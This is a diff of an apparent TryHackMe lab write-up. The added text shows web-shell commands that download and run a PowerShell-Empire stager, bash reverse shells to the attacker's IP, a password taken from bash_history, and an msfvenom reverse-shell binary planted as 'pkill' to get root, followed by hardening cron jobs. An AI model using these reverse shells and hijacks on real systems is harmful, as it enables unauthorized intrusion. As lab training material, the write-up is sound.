@@ -9,6 +9,8 @@ Goals:
 - Invent or research booby trapping 
 - Get DFIR theory-crafting 
 Learnt:
+- Practiced Empire
+- killing pty /dev/pts prevents some privilege escalation
 Beyond Root:
 - Booby traps for battlegrounds
 - Better \*-shells for persistence - not the shell code just location, naming, parametres
@@ -25,6 +27,8 @@ The time to live(ttl) indicates its OS. It is a decrementation from each hop bac
 
 THM machine and the comments on the webpages
 ![](comments.png)
+
+## Exploit
 
 Testing the file upload
 ![](testingthefileupload.png)
@@ -54,21 +58,92 @@ The capabilities of the attacker can be accessed by the naming of the both the f
 - If it was false flagging this is a fake attack chain laid to for whatever reason present because of something related to overall objectives such that it is required to spend time to false flag
 	- Potentially being caught to thow of purple team
 	- Misleading purple into not considering more complex forms of persistence
-```bash
-base64encodedpayload=$(echo "/bin/bash -c 'exec bash -i &>/dev/tcp/10.11.3.193/1338 <&1'" | base64 -w0)
 
-curl http://10.10.72.190/cvs/shell.pdf.php?cmd=%22%65%63%68%6f%20%24%62%61%73%65%36%34%65%6e%63%6f%64%65%64%70%61%79%6c%6f%61%64%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%22
+
+I wanted to go a bit more try hard and use Powershell-Empire as my brain was clouded by covid 
+```bash
+http://10.10.46.245/cvs/shell.pdf.php?cmd=wget%20http://10.11.3.193/empire.sh
+
+http://10.10.46.245/cvs/shell.pdf.php?cmd=chmod%20+x%20empire.sh
+
+http://10.10.46.245/cvs/shell.pdf.php?cmd=bash%20empire.sh
 ```
 
+![](hellothere.png)
 
-## Exploit
 
 ## Foothold
 
+For Two is one and one is none:
+```powershell
+(Empire: 1B17TKZC) > shell "bash -c 'exec bash -i &>/dev/tcp/10.11.3.193/1338 <&1' &"
+```
+
+![](oneplusone.png)
+Counter measure it kills any `python -c 'import pty;pty.spawn("/bin/bash")'` but allows for execution from /dev/shm.
+![](makeitnotsothatdevshmisexec.png)
+
+Quick look in the home directory of the lachan user
+![](lachanuser.png)
+
+and in his bash_history
+![](interstinghistory.png)
+
+```bash
+echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123"
+```
+
+` lachlan : thisistheway123 `, but Al did not check the cron
+
+![](interestingpersistence.png)
+
 ## PrivEsc
+
+We cannot use sudo as we require a tty. But also a very important detail I skimmed over  as I started researching sudo. Al wants to go fast, but second guessing that as the dirty hack solution [krobe got me covered](https://medium.com/@krobesec/hacker-vs-hacker-tryhackme-writeup-1518f88a2c27). The only binary that is hijackable in the path is `pkill`
+
+- Go back to noting each finding never skimp on notes. it is in the picture above.
+
+Just hijack with a msfvenom shell called pkill in the /home/lachlan/bin
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.3.193 LPORT=4444 -f ELF > pkill
+```
+
+Then we can just use `scp`
+```bash
+scp 'pkill' lachlan@10.10.46.245:/home/lachlan/bin/pkill
+```
+Then the quick chmod o'clock with +x
+```bash
+thisistheway123
+chmod +x bin/pkill
+```
+
+![](root.png)
 
 ## Beyond Root
 
-I really want to make a couple of machines with this kind of path with obstacles.
+I really want to make a couple of machines with this kind of path with these kinds of obstacles.
 
+```bash
+apt install fail2ban
+```
 
+[Change /dev/shm to not allow execution](https://secscan.acron.pl/centos7/1/1/17)
+```bash
+mount -o remount,noexec,rw,nosuid,relatime /dev/shm
+```
+
+Remove the webshells and its process Holo or a HTB ctf did this but did not kill the process.
+```bash
+* * * * * * root /bin/sleep 10 && for f in `/bin/ls /var/www/html | grep -v .html`; do p=$(ps -aux | grep $f | awk '{print $2}') && kill $p && rm /var/www/html/$f; done
+```
+
+Kill ptys
+```bash
+* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && /usr/bin/pkill  -9 -t pts/$f; done
+* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && /usr/bin/pkill  -9 -t pts/$f; done
+* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && /usr/bin/pkill  -9 -t pts/$f; done
+* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && /usr/bin/pkill  -9 -t pts/$f; done
+* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && /usr/bin/pkill  -9 -t pts/$f; done
+* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && /usr/bin/pkill -9 -t pts/$f; done
+```
